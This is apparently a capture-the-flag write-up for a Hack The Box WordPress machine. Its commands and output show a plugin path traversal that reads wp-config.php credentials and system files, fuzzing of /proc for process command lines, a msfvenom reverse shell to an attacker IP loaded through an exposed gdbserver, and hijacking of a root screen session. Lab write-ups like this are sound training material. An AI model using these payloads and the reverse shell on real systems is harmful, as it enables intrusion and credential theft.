> Author: **[hkabubaker17][author-profile]**

## Discovery

### Port Scanning

TCP:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP:

```bash
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

### Enumeration

The website is made from Wordpress:

```bash
wpscan --url http://10.10.11.125/ -e ap,at,tt,cb,dbe,u,m -o discovery/wordpress.txt
# [+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
# [+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
# [+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
# [+] WordPress version 5.7.1 identified (Latest, released on 2021-04-15).
# [+] WordPress theme in use: twentyseventeen
# [+] admin
#  | Found By: Rss Generator (Passive Detection)
#  | Confirmed By:
#  |  Wp Json Api (Aggressive Detection)
#  |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&page=1
#  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
#  |  Login Error Messages (Aggressive Detection)
```

### Web Browsing

It is an empty Wordpress template.

Some directory listings are available, in particular `http://10.10.11.125/wp-content/plugins/ebook-download/`:

![][vulnerable-plugin]

## Admin on the Web Console

This plugin has a [path traversal vulnerability][ebook-plugin-exploit].
`/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php` returns:

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );
/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

```bash
ffuf -c -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../FUZZ \
    -w www/lfi.txt -o discovery/files.lfi.txt -fw 1
# etc%2fpasswd%00         [Status: 200, Size: 1994, Words: 17, Lines: 36]
# etc%2fpasswd            [Status: 200, Size: 1992, Words: 17, Lines: 36]
# /etc/adduser.conf       [Status: 200, Size: 3164, Words: 402, Lines: 89]
# /etc/apache2/apache2.conf [Status: 200, Size: 7391, Words: 954, Lines: 228]
# /etc/apache2/envvars    [Status: 200, Size: 1927, Words: 190, Lines: 48]
# /etc/apache2/mods-available/deflate.conf [Status: 200, Size: 600, Words: 23, Lines: 11]
# /etc/apache2/mods-available/autoindex.conf [Status: 200, Size: 3585, Words: 313, Lines: 97]
# /etc/apache2/mods-available/dir.conf [Status: 200, Size: 350, Words: 15, Lines: 6]
# /etc/apache2/mods-available/proxy.conf [Status: 200, Size: 1021, Words: 124, Lines: 28]
# /etc/apache2/mods-available/mime.conf [Status: 200, Size: 7872, Words: 943, Lines: 252]
# /etc/apache2/mods-available/setenvif.conf [Status: 200, Size: 1488, Words: 113, Lines: 33]
# /etc/apache2/mods-available/ssl.conf [Status: 200, Size: 3303, Words: 431, Lines: 86]
# /etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 1036, Words: 115, Lines: 25]
# /etc/apache2/mods-enabled/deflate.conf [Status: 200, Size: 594, Words: 23, Lines: 11]
# /etc/apache2/mods-enabled/dir.conf [Status: 200, Size: 344, Words: 15, Lines: 6]
# /etc/apache2/mods-enabled/negotiation.conf [Status: 200, Size: 935, Words: 109, Lines: 21]
# /etc/apache2/mods-enabled/mime.conf [Status: 200, Size: 7866, Words: 943, Lines: 252]
# /etc/apache2/mods-enabled/status.conf [Status: 200, Size: 945, Words: 82, Lines: 30]
# /etc/apache2/ports.conf [Status: 200, Size: 474, Words: 36, Lines: 16]
# /etc/bash.bashrc        [Status: 200, Size: 2452, Words: 399, Lines: 72]
# /etc/ca-certificates.conf [Status: 200, Size: 6726, Words: 64, Lines: 161]
# /etc/ca-certificates.conf.dpkg-old [Status: 200, Size: 6752, Words: 64, Lines: 161]
# /etc/crontab            [Status: 200, Size: 1163, Words: 181, Lines: 23]
# /etc/crypttab           [Status: 200, Size: 178, Words: 5, Lines: 2]
# /etc/deluser.conf       [Status: 200, Size: 740, Words: 86, Lines: 21]
# /etc/debconf.conf       [Status: 200, Size: 3105, Words: 411, Lines: 84]
# /etc/default/grub       [Status: 200, Size: 1557, Words: 150, Lines: 34]
# /etc/dhcp/dhclient.conf [Status: 200, Size: 1889, Words: 168, Lines: 55]
# /etc/fstab              [Status: 200, Size: 790, Words: 84, Lines: 13]
# /etc/ftpusers           [Status: 200, Size: 256, Words: 10, Lines: 15]
# /etc/fuse.conf          [Status: 200, Size: 407, Words: 38, Lines: 9]
# /etc/hdparm.conf        [Status: 200, Size: 5193, Words: 757, Lines: 143]
# /etc/hosts              [Status: 200, Size: 338, Words: 22, Lines: 10]
# /etc/host.conf          [Status: 200, Size: 219, Words: 16, Lines: 4]
# /etc/hosts.allow        [Status: 200, Size: 544, Words: 82, Lines: 11]
# /etc/hosts.deny         [Status: 200, Size: 841, Words: 128, Lines: 18]
# /etc/issue.net          [Status: 200, Size: 146, Words: 3, Lines: 2]
# /etc/issue              [Status: 200, Size: 140, Words: 5, Lines: 2]
# /etc/ld.so.conf         [Status: 200, Size: 164, Words: 2, Lines: 3]
# /etc/ldap/ldap.conf     [Status: 200, Size: 474, Words: 23, Lines: 18]
# /etc/logrotate.conf     [Status: 200, Size: 675, Words: 77, Lines: 25]
# /etc/login.defs         [Status: 200, Size: 10680, Words: 1638, Lines: 342]
# /etc/manpath.config     [Status: 200, Size: 5357, Words: 530, Lines: 133]
# /etc/ltrace.conf        [Status: 200, Size: 15000, Words: 1011, Lines: 544]
# /etc/modules            [Status: 200, Size: 316, Words: 33, Lines: 6]
# /etc/mtab               [Status: 200, Size: 2781, Words: 181, Lines: 37]
# /etc/mysql/my.cnf       [Status: 200, Size: 818, Words: 89, Lines: 22]
# /etc/mysql/my.cnf%00    [Status: 200, Size: 820, Words: 89, Lines: 22]
# /etc/networks           [Status: 200, Size: 215, Words: 11, Lines: 3]
# /etc/os-release         [Status: 200, Size: 512, Words: 6, Lines: 13]
# /etc/pam.conf           [Status: 200, Size: 676, Words: 65, Lines: 16]
# /etc/passwd             [Status: 200, Size: 1995, Words: 17, Lines: 36]
# /etc/passwd-            [Status: 200, Size: 1983, Words: 16, Lines: 36]
# /etc/passwd%00          [Status: 200, Size: 1997, Words: 17, Lines: 36]
# etc/passwd%00           [Status: 200, Size: 1994, Words: 17, Lines: 36]
# /etc/profile            [Status: 200, Size: 702, Words: 145, Lines: 28]
# /etc/resolv.conf        [Status: 200, Size: 850, Words: 98, Lines: 19]
# /etc/security/access.conf [Status: 200, Size: 4724, Words: 635, Lines: 123]
# /etc/security/group.conf [Status: 200, Size: 3792, Words: 690, Lines: 107]
# /etc/security/limits.conf [Status: 200, Size: 2321, Words: 747, Lines: 57]
# /etc/security/namespace.conf [Status: 200, Size: 1609, Words: 219, Lines: 29]
# /etc/security/time.conf [Status: 200, Size: 2333, Words: 342, Lines: 66]
# /etc/security/pam_env.conf [Status: 200, Size: 3135, Words: 429, Lines: 74]
# /etc/security/sepermit.conf [Status: 200, Size: 585, Words: 106, Lines: 12]
# /etc/ssh/sshd_config    [Status: 200, Size: 3461, Words: 296, Lines: 125]
# /etc/sysctl.conf        [Status: 200, Size: 2484, Words: 250, Lines: 69]
# /etc/sysctl.d/10-network-security.conf [Status: 200, Size: 357, Words: 14, Lines: 7]
# /etc/sysctl.d/10-console-messages.conf [Status: 200, Size: 276, Words: 13, Lines: 4]
# /etc/vsftpd.conf        [Status: 200, Size: 5978, Words: 806, Lines: 155]
# /etc/vsftpd.conf%00     [Status: 200, Size: 5980, Words: 806, Lines: 155]
# /proc/cmdline           [Status: 200, Size: 429, Words: 14, Lines: 2]
# /proc/devices           [Status: 200, Size: 675, Words: 97, Lines: 61]
# /proc/meminfo           [Status: 200, Size: 1599, Words: 516, Lines: 54]
# /proc/cpuinfo           [Status: 200, Size: 2312, Words: 271, Lines: 57]
# /proc/net/udp           [Status: 200, Size: 636, Words: 135, Lines: 5]
# /proc/net/tcp           [Status: 200, Size: 1174, Words: 369, Lines: 8]
# /proc/self/stat         [Status: 200, Size: 448, Words: 52, Lines: 2]
# /proc/self/mounts       [Status: 200, Size: 2805, Words: 181, Lines: 37]
# /proc/self/status       [Status: 200, Size: 1493, Words: 93, Lines: 56]
# /proc/version           [Status: 200, Size: 274, Words: 17, Lines: 2]
# /boot/grub/grub.cfg     [Status: 200, Size: 9712, Words: 1003, Lines: 276]
# /usr/share/adduser/adduser.conf [Status: 200, Size: 3206, Words: 402, Lines: 89]
```

```bash
grep -via nologin sources/passwd 
# sync:x:4:65534:sync:/bin:/bin/sync
# tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
# pollinate:x:110:1::/var/cache/pollinate:/bin/false
# user:x:1000:1000:user:/home/user:/bin/bash
# lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
# mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

## System User

```bash
python -c '[print(i) for i in range(2000)]' > www/pid.txt
ffuf -c -w www/pid.txt -o discovery/proc.txt \
    -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/FUZZ/cmdline
# 854                     [Status: 200, Size: 234, Words: 12, Lines: 1, Duration: 61ms]
# 855                     [Status: 200, Size: 232, Words: 11, Lines: 1, Duration: 61ms]
# 861                     [Status: 200, Size: 199, Words: 5, Lines: 1, Duration: 63ms]
# 864                     [Status: 200, Size: 189, Words: 8, Lines: 1, Duration: 63ms]
# 941                     [Status: 200, Size: 179, Words: 3, Lines: 1, Duration: 62ms]
# 997                     [Status: 200, Size: 196, Words: 5, Lines: 1, Duration: 68ms]
curl -i -s -k -X $'GET' \
    $'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/854/cmdline'
# /bin/sh -c 'while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done'
curl -i -s -k -X $'GET' \
    $'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/855/cmdline'
# /bin/sh -c 'while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done'
curl -i -s -k -X $'GET' \
    $'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/861/cmdline'
# su user -c 'cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;'
```

The backdoor is a GDB endpoint!

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f elf -o rs.elf
gdb
# target extended-remote 10.10.11.125:1337
# 0x00007fffffffec58│+0x0018: 0x00007fffffffee51  →  "SHELL=/bin/bash"
# 0x00007fffffffec60│+0x0020: 0x00007fffffffee61  →  "PWD=/home/user"
# 0x00007fffffffec68│+0x0028: 0x00007fffffffee70  →  "LOGNAME=user"
# 0x00007fffffffec70│+0x0030: 0x00007fffffffee7d  →  "XDG_SESSION_TYPE=unspecified"
# 0x00007fffffffec78│+0x0038: 0x00007fffffffee9a  →  "_=/usr/bin/gdbserver"
# remote put rs.elf rs.elf
# set remote exec-file /home/user/rs.elf
# show remote exec-file
# b main
# run
```

## System Root

Stabilize the shell and then run:

```bash
screen -x root/root
```

The previous enumeration already showed us the screen session running as root.
This simply connects to it, job's done.

[author-profile]: https://app.hackthebox.com/users/79623

[ebook-plugin-exploit]: https://www.exploit-db.com/exploits/39575
[vulnerable-plugin]: images/screenshots/plugin.png
